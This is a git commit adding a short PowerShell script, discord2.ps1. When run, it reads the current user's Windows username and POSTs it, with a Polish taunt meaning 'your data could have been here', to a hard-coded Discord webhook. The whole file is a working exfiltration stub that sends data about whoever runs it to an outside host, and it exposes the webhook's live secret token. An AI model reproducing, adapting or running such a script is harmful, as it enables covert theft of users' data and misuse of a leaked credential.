f12f20bb8c9b31ce4b376df33dc89a237fa6203f
Stachov <94226771+Stachov@users.noreply.github.com>
2023-10-26 00:12:30 +0200

    Create discord2.ps1

---
+++ discord2.ps1
@@ -0,0 +1,7 @@
+$text2 = 'Tu mogły być twoje dane'
+$dc = "https://discord.com/api/webhooks/1162111449640992889/86j3GRsIdt77zoPwzCqfQ06IRyfwrkDZjCznxrHWwXm_ZaUP6F6aj1OScc4rE0tu85js" 
+$Body = @{
+  'username' = $env:username
+  'content' = $text2
+}
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)
